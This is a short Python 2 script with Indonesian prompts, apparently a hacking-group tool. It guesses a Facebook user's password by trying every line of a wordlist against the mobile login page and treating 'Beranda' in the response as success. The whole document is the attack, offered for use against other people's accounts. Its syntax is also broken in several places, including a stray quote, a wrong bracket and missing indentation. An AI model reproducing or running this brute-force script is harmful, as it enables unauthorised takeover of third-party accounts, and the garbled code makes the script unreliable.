import requests
import sys


print(" Admin : M4uL ~ St1nky")










email = raw_input(" Masukan Username Target :")
url='https://free.facebook.com/login.php'
ex = open('word.txt','r').readlines()
for line in ex:
password = line.strip()"
http = requests.post(url, data=('email':email, 'pass':password, 'login':'sumbit'})
content = http.content
if "Beranda" in content:
print "[-] Password Ditemukan",password
sys.exit(1)
else:
print "[-] Password Salah Ntod :v",password
